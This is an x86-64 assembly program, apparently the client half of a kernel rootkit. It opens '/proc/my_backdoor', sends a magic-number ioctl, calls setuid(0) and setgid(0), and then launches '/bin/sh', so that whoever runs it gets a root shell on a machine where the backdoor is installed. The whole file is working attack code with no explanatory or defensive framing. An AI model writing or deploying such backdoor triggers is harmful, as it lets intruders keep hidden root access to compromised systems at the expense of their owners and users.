[BITS 64]
global _start
_start:
    push	2
    pop		rax
    mov		rdi, path
    xor		rsi, rsi
    xor		rdx, rdx
    syscall

    mov		rdi, rax
    push	16
    pop		rax
    push	1992
    push	1942
    pop		rsi
    pop		rdx
    syscall

    ; setuid(0)
    push	105
    pop		rax
    xor		rdi, rdi
    syscall
    test	rax, rax
    jne		fail

    ; setgid(0)
    push	106
    pop		rax
    xor		rdi, rdi
    syscall

    push	0x68
    mov		rax, 0x732f2f2f6e69622f
    push	rax
    mov		rdi, rsp
    push	0x1010101 ^ 0x6873
    xor		dword [rsp], 0x1010101
    xor		esi, esi
    push	rsi
    push	8
    pop		rsi
    add		rsi, rsp
    push	rsi
    mov		rsi, rsp
    xor		edx, edx
    push	0x3b
    pop		rax
    syscall

    push	60
    pop		rax
    xor		rdi, rdi
    syscall

    fail:
    push	60
    pop		rax
    push	1
    pop		rdi
    syscall

path:
db "/proc/my_backdoor",0x00
shell:
db "/bin/sh",0x00
